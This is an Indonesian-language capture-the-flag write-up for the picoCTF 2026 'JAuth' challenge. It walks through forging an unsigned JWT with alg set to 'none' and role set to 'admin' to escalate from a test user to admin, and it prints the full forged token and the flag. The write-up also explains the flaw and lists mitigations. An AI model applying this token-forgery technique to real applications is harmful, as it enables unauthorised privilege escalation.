# JAuth - picoCTF 2026

| Informasi | Detail |
|---|---|
| Event | picoCTF 2026 |
| Challenge | JAuth |
| Kategori | Web Exploitation |
| Poin | 300 |
| Difficulty | Medium |
| Author | Geoffrey Njogu |

## Deskripsi Challenge

Challenge ini membahas kasus penggunaan komponen pihak ketiga pada aplikasi web tanpa memastikan konfigurasi dan perilaku keamanannya. Pada kasus ini, target memakai mekanisme autentikasi berbasis JWT.

Deskripsi challenge:

```text
Most web application developers use third party components without testing their security. Some of the past affected companies are:

Equifax (a US credit bureau organization) - breach due to unpatched Apache Struts web framework CVE-2017-5638
Mossack Fonesca (Panama Papers law firm) breach - unpatched version of Drupal CMS used
VerticalScope (internet media company) - outdated version of vBulletin forum software used
Can you identify the components and exploit the vulnerable one?
The website is running here. Can you become an admin?

You can login as test with the password Test123! to get started.
```

Credential awal yang diberikan:

```text
Username: test
Password: Test123!
```

Hint yang diberikan:

```text
1. Use the web browser tools to check out the JWT cookie.
2. The JWT should always have two (2) . separators.
```

Dari hint tersebut, fokus challenge cukup jelas: cookie session berisi JWT, lalu token tersebut perlu dianalisis dan dimodifikasi agar user biasa bisa menjadi admin.

## Reconnaissance / Analisis Awal

Pertama, saya login ke website menggunakan credential yang sudah diberikan oleh challenge:

```text
Username: test
Password: Test123!
```

Setelah berhasil login, saya membuka browser DevTools, lalu masuk ke bagian:

```text
Application -> Cookies
```

Di sana terdapat cookie autentikasi berbentuk JWT. Token tersebut kemudian saya copy dan decode menggunakan website JWT decoder seperti token.dev.

Hasil decode awal menunjukkan struktur token seperti berikut:

```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

Payload token:

```json
{
  "auth": 1781274882871,
  "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
  "role": "user",
  "iat": 1781274883
}
```

Dari payload tersebut terlihat bahwa hak akses user dikontrol oleh field berikut:

```json
"role": "user"
```

Karena targetnya adalah menjadi admin, percobaan pertama yang dilakukan adalah mengganti nilai role menjadi admin:

```json
"role": "admin"
```

Namun setelah token hasil modifikasi dipasang kembali ke cookie browser, akses admin masih gagal.

## Vulnerability Identified

Vulnerability utama pada challenge ini adalah **JWT none algorithm / unsigned JWT acceptance**.

JWT normalnya terdiri dari tiga bagian:

```text
header.payload.signature
```

Pada token awal, header menggunakan algoritma berikut:

```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

`HS256` berarti token ditandatangani menggunakan HMAC-SHA256 dengan secret key di sisi server. Jika payload diubah dari `role: user` menjadi `role: admin`, signature lama otomatis menjadi tidak valid, karena signature dihitung dari kombinasi header dan payload.

Itulah alasan kenapa hanya mengganti payload tidak berhasil. Server masih memverifikasi signature token, sedangkan attacker tidak memiliki secret key untuk membuat signature HS256 yang valid.

Masalahnya, beberapa implementasi JWT yang rentan menerima header dengan algoritma:

```json
{
  "typ": "JWT",
  "alg": "none"
}
```

`alg: none` berarti token dianggap tidak menggunakan signature. Pada implementasi yang aman, server tidak boleh menerima token unsigned untuk endpoint autentikasi. Namun pada implementasi yang rentan, server mempercayai nilai `alg` dari header token dan melewati proses verifikasi signature.

Jadi alasan `alg` perlu diganti menjadi `none` adalah:

1. Payload sudah dimodifikasi menjadi admin.
2. Signature HS256 lama tidak valid lagi setelah payload berubah.
3. Attacker tidak mengetahui secret key untuk membuat signature HS256 baru.
4. Dengan `alg: none`, token dibuat unsigned.
5. Server yang rentan menerima token unsigned tersebut dan langsung mempercayai isi payload.

Dengan kata lain, bug-nya bukan karena `alg: none` selalu boleh dipakai, tetapi karena server salah konfigurasi atau memakai library JWT secara tidak aman sampai menerima token tanpa signature untuk proses autentikasi.

## Exploitation Steps

### 1. Login sebagai user biasa

Saya login menggunakan credential berikut:

```text
Username: test
Password: Test123!
```

Setelah login berhasil, aplikasi membuat cookie JWT untuk user biasa.

### 2. Mengambil JWT dari cookie

JWT diambil melalui browser DevTools:

```text
Application -> Cookies
```

Token kemudian didecode menggunakan token.dev agar header dan payload-nya lebih mudah dibaca.

Header awal:

```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

Payload awal:

```json
{
  "auth": 1781274882871,
  "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
  "role": "user",
  "iat": 1781274883
}
```

### 3. Mengubah role menjadi admin

Payload dimodifikasi dari:

```json
"role": "user"
```

Menjadi:

```json
"role": "admin"
```

Percobaan ini belum berhasil ketika header masih menggunakan `HS256`, karena signature token menjadi tidak valid.

### 4. Mengubah algoritma JWT menjadi none

Berdasarkan referensi OWASP Web Security Testing Guide tentang pengujian JWT, saya mencoba mengganti algoritma pada header menjadi `none`.

Header dimodifikasi menjadi:

```json
{
  "typ": "JWT",
  "alg": "none"
}
```

Payload tetap menggunakan role admin:

```json
{
  "auth": 1781274882871,
  "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
  "role": "admin",
  "iat": 1781274883
}
```

### 5. Memastikan format JWT tetap valid

Awalnya token dengan `alg: none` masih belum berhasil. Setelah membaca hint kedua:

```text
The JWT should always have two (2) . separators.
```

Saya sadar bahwa JWT tetap harus memiliki tiga bagian walaupun signature-nya kosong.

Format JWT yang benar untuk `alg: none` adalah:

```text
base64url(header).base64url(payload).
```

Perhatikan titik di akhir token. Titik terakhir tersebut menandakan bagian signature tetap ada, tetapi nilainya kosong.

Token final yang digunakan:

```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNzgxMjc0ODgyODcxLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNDkuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4MTI3NDg4M30.
```

Token tersebut memiliki dua separator `.`:

```text
header.payload.
```

Bagian signature memang kosong, tetapi separator terakhir tetap wajib ada agar parser JWT membacanya sebagai token dengan tiga bagian.

### 6. Mengganti cookie dan mengakses halaman admin

Token final dimasukkan kembali ke cookie melalui DevTools. Setelah halaman direfresh, aplikasi menerima JWT unsigned tersebut sebagai token valid dengan role admin.

Akses admin berhasil dan flag ditampilkan.

## Flag

Flag yang didapat:

```text
picoCTF{succ3ss_@u7h3nt1c@710n_bc6d9041}
```

## Kesimpulan

Challenge ini menunjukkan bahaya implementasi JWT yang menerima algoritma `none`. Pada token JWT berbasis `HS256`, payload tidak bisa diubah sembarangan karena signature akan menjadi tidak valid. Namun jika server mempercayai header `alg` dari client dan menerima `none`, attacker dapat membuat token unsigned berisi role admin.

Poin penting dari challenge ini:

1. JWT tidak boleh dipercaya hanya karena formatnya valid.
2. Server harus memaksa algoritma yang diizinkan dari konfigurasi server, bukan dari input header token.
3. `alg: none` harus ditolak untuk token autentikasi.
4. JWT tetap harus memiliki dua separator titik, bahkan ketika signature kosong.
5. Role atau privilege yang disimpan di token harus selalu dilindungi signature yang diverifikasi dengan benar.

## Mitigasi

Beberapa mitigasi yang seharusnya diterapkan:

1. Tolak token dengan `alg: none` pada endpoint autentikasi.
2. Jangan memilih algoritma verifikasi hanya berdasarkan header JWT dari client.
3. Gunakan allowlist algoritma yang eksplisit, misalnya hanya `HS256` atau hanya `RS256` sesuai desain aplikasi.
4. Pastikan library JWT selalu memverifikasi signature.
5. Simpan secret key dengan aman dan lakukan rotasi jika diperlukan.
6. Validasi claim penting seperti `role`, `iat`, `exp`, dan claim identitas user di sisi server.

## Referensi

- OWASP Web Security Testing Guide: Testing JSON Web Tokens
- JWT none algorithm attack
- JSON Web Token structure
